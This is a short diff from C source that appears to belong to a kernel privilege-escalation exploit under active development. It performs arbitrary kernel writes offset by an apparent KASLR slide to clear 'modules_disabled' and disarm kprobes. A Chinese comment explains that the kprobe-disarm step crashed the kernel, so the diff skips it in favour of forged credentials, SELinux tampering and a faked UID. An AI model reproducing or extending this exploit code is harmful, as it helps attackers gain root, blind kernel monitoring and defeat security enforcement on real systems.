@@ -3345,8 +3345,10 @@ int main(int argc, char **argv)
                                  "modules_disabled", raw, NULL))
                 park_forever("modules_disabled write failed");
 
-        /* 顺序：modules_disabled 清零（安全）之后，再 disarm 全部 kprobe */
-        if (KPROBES_DISARM_STATIC &&
+        /* 顺序：modules_disabled 清零（安全）之后，再 disarm 全部 kprobe。
+         * 2026-11-25: kprobes_disarm 的写入会导致 reap 阶段 panic（连续两轮
+         * 音乐条件都崩在这一步），暂时跳过，先走 fake_cred/selinux/fake_uid。 */
+        if (0 && KPROBES_DISARM_STATIC &&
             stage_write(KPROBES_DISARM_STATIC + g_slide, 1, "kprobes_disarm", raw, NULL))
             park_forever("kprobes disarm failed");
         }
